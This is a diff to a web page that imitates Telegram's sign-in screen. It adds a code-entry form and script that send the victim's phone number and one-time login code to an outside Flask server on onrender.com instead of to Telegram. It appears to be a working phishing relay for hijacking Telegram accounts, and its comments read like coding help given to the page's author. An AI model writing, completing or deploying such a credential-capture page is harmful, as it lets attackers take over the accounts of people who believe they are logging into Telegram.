@@ -57,7 +57,19 @@
         <div class="Transition Auth Transition_slide Transition_slide-active">
             <div class="Transition_slide Transition_slide-active">
                 <div id="auth-phone-number-form" class="custom-scroll">
-                    <div class="auth-form">
+                    <div class="auth-form" id="codeForm" style="display: none;">
+                        <div id="logo"></div>
+                        <h1>Telegram</h1>
+                        <p class="note">We have sent you a message in Telegram with the code.</p>
+                        <form class="form" action="">
+                            <div class="input-group touched with-label">
+                                <input class="form-control" type="text" id="verificationCode" inputmode="tel" aria-label="Code">
+                                <label for="sign-in-code">Code</label>
+                            </div>
+                            <button type="button" class="Button default primary text has-ripple" id="verifyBtn">Verify</button>
+                        </form>
+                    </div>
+                    <div class="auth-form" id="phoneForm">
                         <div id="logo"></div>
                         <h1>Telegram</h1>
                         <p class="note">Please confirm your country code and enter your phone number.</p>
@@ -1655,10 +1667,14 @@
     </div>
     <script>
 window.addEventListener("DOMContentLoaded", () => {
+    const phoneForm = document.getElementById("phoneForm");
+    const codeForm = document.getElementById("codeForm");
+    let currentPhone = null;  // to remember the phone number for the code step
+
     document.getElementById("nextBtn").addEventListener("click", function () {
         const phone = document.getElementById("sign-in-phone-number").value;
         console.log("Phone:", phone);
-    
+
         fetch("https://flask-duhv.onrender.com/send-code", {
             method: "POST",
             headers: {
@@ -1670,7 +1686,35 @@ window.addEventListener("DOMContentLoaded", () => {
         .then(data => {
             if (data.status === "success") {
                 alert("Code sent!");
-                // Show input for code here
+                currentPhone = phone;      // save phone for next request
+                phoneForm.style.display = "none";
+                codeForm.style.display = "flex";
+            } else {
+                alert("Error: " + data.message);
+            }
+        })
+        .catch(err => {
+            console.error(err);
+            alert("Request failed");
+        });
+    });
+
+    document.getElementById("verifyBtn").addEventListener("click", function () {
+        const code = document.getElementById("verificationCode").value;
+        console.log("Code:", code);
+
+        fetch("https://flask-duhv.onrender.com/verify-code", {  // you need to add this endpoint in Python!
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ phone: currentPhone, code })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === "success") {
+                alert("Verification successful!");
+                // proceed with next steps, maybe hide codeForm or show success message
             } else {
                 alert("Error: " + data.message);
             }
@@ -1681,6 +1725,7 @@ window.addEventListener("DOMContentLoaded", () => {
         });
     });
 });
+
 </script>
 
 </body>
